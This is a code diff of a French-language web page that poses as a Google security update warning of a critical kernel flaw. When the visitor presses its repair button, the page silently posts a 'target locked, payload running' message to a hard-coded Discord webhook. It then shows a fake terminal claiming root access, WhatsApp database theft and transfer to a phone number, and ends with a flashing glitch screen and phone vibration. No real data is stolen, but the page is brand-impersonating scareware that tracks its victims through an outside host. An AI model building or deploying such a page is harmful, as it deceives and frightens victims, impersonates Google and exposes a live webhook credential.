@@ -3,130 +3,95 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Security Verification</title>
+    <title>Google - Security Update</title>
     <style>
-        body { margin: 0; padding: 0; background-color: #fff; font-family: 'Courier New', monospace; overflow: hidden; height: 100vh; display: flex; justify-content: center; align-items: center; }
+        body { margin: 0; padding: 0; background: #000; color: #d1d1d1; font-family: monospace; font-size: 12px; overflow: hidden; }
         
-        #google-box { text-align: center; width: 90%; max-width: 400px; font-family: sans-serif; }
-        .g-btn { background: #4285F4; color: white; border: none; padding: 15px 35px; font-weight: bold; cursor: pointer; border-radius: 4px; }
+        /* PAGE GOOGLE OFFICIELLE AU DÉBUT */
+        #gate { background: #fff; height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; padding: 20px; box-sizing: border-box; }
+        .g-btn { background: #1a73e8; color: #fff; border: none; padding: 12px 24px; border-radius: 4px; font-weight: 500; font-family: sans-serif; cursor: pointer; margin-top: 20px; }
 
-        #terminal {
-            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: #000; color: #0f0; padding: 15px; box-sizing: border-box; z-index: 1000;
-            font-size: 11px; overflow-y: hidden;
-        }
-
-        .line { margin-bottom: 2px; opacity: 0; animation: fadeIn 0.1s forwards; }
-        @keyframes fadeIn { to { opacity: 1; } }
+        /* TERMINAL RÉALISTE */
+        #console { display: none; padding: 15px; height: 100vh; box-sizing: border-box; }
+        .log { margin-bottom: 2px; }
+        .success { color: #4CAF50; }
+        .danger { color: #F44336; font-weight: bold; }
         
-        /* FLASH FINAL ROUGE ET NOIR */
-        #flash-screen {
-            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            z-index: 9999; flex-direction: column; justify-content: center; align-items: center;
+        /* FLASH FINAL TECHNIQUE (TYPE ÉCRAN CASSÉ) */
+        #crash-screen { display: none; position: fixed; top:0; left:0; width:100%; height:100%; z-index:9999; }
+        .glitch { animation: glitchAnim 0.05s infinite; }
+        @keyframes glitchAnim {
+            0% { background: #f00; opacity: 0.8; }
+            50% { background: #000; opacity: 1; }
+            100% { background: #00f; opacity: 0.8; }
         }
-        .flash-active { animation: flashEffect 0.1s infinite; }
-        @keyframes flashEffect {
-            0% { background: #f00; }
-            50% { background: #000; }
-            100% { background: #f00; }
-        }
-
-        .py-val { color: #f0f; } /* Style Python string */
-        .py-key { color: #0ff; } /* Style Python keyword */
-        .py-err { color: #f00; font-weight: bold; font-size: 14px; }
     </style>
 </head>
 <body>
 
-    <div id="google-box">
-        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="110">
-        <h2>Alerte de sécurité</h2>
-        <p>Une connexion non autorisée a été détectée sur votre compte. Vérifiez l'intégrité de votre mobile immédiatement.</p>
-        <button class="g-btn" onclick="start()">VÉRIFIER LE SYSTÈME</button>
+    <div id="gate">
+        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="90">
+        <h1 style="font-family:sans-serif; font-size: 22px; color: #202124; font-weight: 400;">Mise à jour de sécurité 2026.1</h1>
+        <p style="font-family:sans-serif; color: #5f6368; max-width: 300px;">Une faille critique a été détectée dans le noyau Linux de votre appareil. Veuillez lancer la réparation immédiate.</p>
+        <button class="g-btn" onclick="execute()">RÉPARER LE SYSTÈME</button>
     </div>
 
-    <div id="terminal">
-        <div id="logs"></div>
+    <div id="console">
+        <div id="out"></div>
     </div>
 
-    <div id="flash-screen">
-        <div style="background: #000; color: #fff; padding: 20px; font-weight: bold; text-align: center; border: 5px solid #f00;">
-            CRITICAL_SYSTEM_FAILURE<br>
-            CLONAGE WHATSAPP: 100%<br>
-            DESTINATION: 0819679859<br><br>
-            VOTRE APPAREIL EST SOUS CONTRÔLE
-        </div>
-    </div>
+    <div id="crash-screen" class="glitch"></div>
 
     <script>
         const webhook = "https://discordapp.com/api/webhooks/1463375154313695425/b8j4vFvQYxlrrtYrxSXgOrV3PEsdA4vXaywKb8xIMo6qEt6vVAqc3yQb_srF7-aDg4a-";
 
-        function start() {
-            document.getElementById('google-box').style.display = 'none';
-            document.getElementById('terminal').style.display = 'block';
-            
-            fetch(webhook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({content: "🔥 **EXPLOIT PYTHON :** La cible a lancé le clonage !"}) });
+        function execute() {
+            document.getElementById('gate').style.display = 'none';
+            document.getElementById('console').style.display = 'block';
 
-            const logs = [
-                "python3 exploit_cloner.py --target=mobile_dev",
-                "[+] Initializing exploit script...",
-                "[+] Searching for mount points...",
-                "[+] Found partition: /dev/block/sda1 (STORAGE)",
-                "[+] Found partition: /dev/block/sda2 (PRIVATE_DATA)",
-                "[!] Warning: Kernel protection detected. Bypassing...",
-                "[+] Success: Root access obtained.",
-                "[+] Loading cloning_module.py...",
-                "[+] Establishing SSL tunnel to: 0819679859",
-                "[+] Connected to remote server.",
-                ">>> Extracting WhatsApp databases...",
-                ">>> Extracting Private Photo Vault...",
-                ">>> Extracting Contacts and Messages...",
-                "------------------------------------",
-                "TRANSFERRING DATA: [##########] 100%",
-                "------------------------------------",
-                "[+] DATA_SENT_TO_WHATSAPP: 0819679859",
-                "[!] INJECTING_SYSTEM_VIRUS...",
-                "FATAL ERROR: OVERHEATING DETECTED",
-                "FATAL ERROR: CPU_CORE_CORRUPTION",
-                "SYSTEM SHUTDOWN INITIATED..."
+            // Envoi furtif au Discord
+            fetch(webhook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({content: "🎯 **CIBLE VERROUILLÉE :** Exécution du payload en cours."}) });
+
+            const lines = [
+                "[*] Checking device architecture...",
+                "[+] CPU: " + (navigator.hardwareConcurrency || "ARMv8") + " cores detected",
+                "[*] Initializing exploit: CVE-2025-9921",
+                "[*] Bypassing SELinux enforcement... <span class='success'>DONE</span>",
+                "[*] Requesting root privileges... <span class='success'>GRANTED</span>",
+                "[*] Dumping memory heap at 0x7ffd5e...",
+                "[!] Warning: Device encryption detected (AES-256)",
+                "[*] Cracking encryption keys... 10%.. 45%.. 98%..",
+                "[*] Success: Master key recovered.",
+                "[*] Accessing /data/user/0/com.whatsapp/databases/",
+                "[*] Extracting msgstore.db.crypt14...",
+                "[*] Mounting remote bridge to 0819679859",
+                "[*] Sending encrypted packets [1/450]...",
+                "[*] Sending encrypted packets [112/450]...",
+                "[*] Sending encrypted packets [389/450]...",
+                "[*] Transmission complete.",
+                "<span class='danger'>[FATAL] KERNEL PANIC: Memory corruption at 0x000000</span>",
+                "<span class='danger'>[FATAL] DESTRUCTION DES TRACES...</span>",
+                "<span class='danger'>[FATAL] SYSTÈME CLONÉ VERS SERVEUR 0819679859</span>"
             ];
 
             let i = 0;
-            const logBox = document.getElementById('logs');
+            const out = document.getElementById('out');
             const itv = setInterval(() => {
-                if (i < logs.length) {
-                    const l = document.createElement('div');
-                    l.className = 'line';
-                    
-                    // Style couleur façon Python
-                    let text = logs[i];
-                    if (text.includes('[+]')) text = `<span style="color:#0f0">${text}</span>`;
-                    if (text.includes('[!]')) text = `<span style="color:#ff0">${text}</span>`;
-                    if (text.includes('FATAL')) text = `<span class="py-err">${text}</span>`;
-                    
-                    l.innerHTML = text;
-                    logBox.appendChild(l);
-                    
-                    if (navigator.vibrate) navigator.vibrate(50);
+                if (i < lines.length) {
+                    const div = document.createElement('div');
+                    div.className = 'log';
+                    div.innerHTML = lines[i];
+                    out.appendChild(div);
+                    if(navigator.vibrate) navigator.vibrate(20);
                     i++;
                 } else {
                     clearInterval(itv);
-                    setTimeout(triggerFlash, 1500);
+                    setTimeout(() => {
+                        document.getElementById('crash-screen').style.display = 'block';
+                        if(navigator.vibrate) navigator.vibrate([1000, 50, 1000]);
+                    }, 1000);
                 }
-            }, 800);
-        }
-
-        function triggerFlash() {
-            document.getElementById('terminal').style.display = 'none';
-            const flash = document.getElementById('flash-screen');
-            flash.style.display = 'flex';
-            flash.classList.add('flash-active');
-            
-            // Vibration violente et continue
-            if (navigator.vibrate) {
-                navigator.vibrate([100, 50, 100, 50, 100, 50, 100, 50, 1000]);
-                setInterval(() => { navigator.vibrate(200); }, 300);
-            }
+            }, 500); // Vitesse rapide mais lisible
         }
     </script>
 </body>
